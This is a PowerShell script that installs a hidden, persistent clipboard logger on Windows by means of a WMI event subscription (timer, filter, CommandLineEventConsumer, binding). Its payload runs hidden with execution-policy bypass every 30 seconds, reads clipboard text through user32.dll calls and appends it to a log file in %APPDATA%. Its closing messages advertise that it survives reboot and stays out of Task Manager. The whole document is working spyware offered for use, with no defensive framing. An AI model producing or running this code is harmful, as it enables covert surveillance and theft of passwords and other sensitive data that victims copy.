# ================================
# Hidden Persistent Clipboard Monitor via WMI
# ================================

Write-Host "[*] Setting up hidden clipboard monitor..."

# 1. Create WMI Timer that fires every 30 seconds
$timer = Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction -Arguments @{
    TimerId = 'cbMonitorTimer'
    IntervalBetweenEvents = 30
}

# 2. Create Event Filter that listens for that timer
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name           = 'cbMonitorFilter'
    EventNamespace = 'root\cimv2'
    QueryLanguage  = 'WQL'
    Query          = "SELECT * FROM __TimerEvent WHERE TimerID='cbMonitorTimer'"
}

# 3. Define the PowerShell clipboard payload
$clipboardPayload = 'powershell -w hidden -ep bypass -c "Add-Type @\"using System;using System.Runtime.InteropServices;public class C{[DllImport(\"user32.dll\")]public static extern bool OpenClipboard(IntPtr h);[DllImport(\"user32.dll\")]public static extern bool CloseClipboard();[DllImport(\"user32.dll\")]public static extern IntPtr GetClipboardData(uint f);[DllImport(\"user32.dll\")]public static extern bool IsClipboardFormatAvailable(uint f);public const uint CF_UNICODETEXT=13;}\"@;if([C]::OpenClipboard([IntPtr]::Zero)){if([C]::IsClipboardFormatAvailable([C]::CF_UNICODETEXT)){$p=[C]::GetClipboardData([C]::CF_UNICODETEXT);$t=[Runtime.InteropServices.Marshal]::PtrToStringUni($p);Add-Content -Path `"$env:APPDATA\\cb.log`" -Value `"\$(Get-Date) -> $t`"};[C]::CloseClipboard()}"'

# 4. Create CommandLineEventConsumer that runs the payload
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name                = 'cbMonitorConsumer'
    CommandLineTemplate = $clipboardPayload
}

# 5. Bind the filter to the consumer so it triggers
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter   = $filter.__PATH
    Consumer = $consumer.__PATH
}

Write-Host "[+] Clipboard monitor installed!"
Write-Host "    - Logs will be saved to %APPDATA%\cb.log"
Write-Host "    - It will run hidden every 30s, survives reboot, invisible in Task Manager."
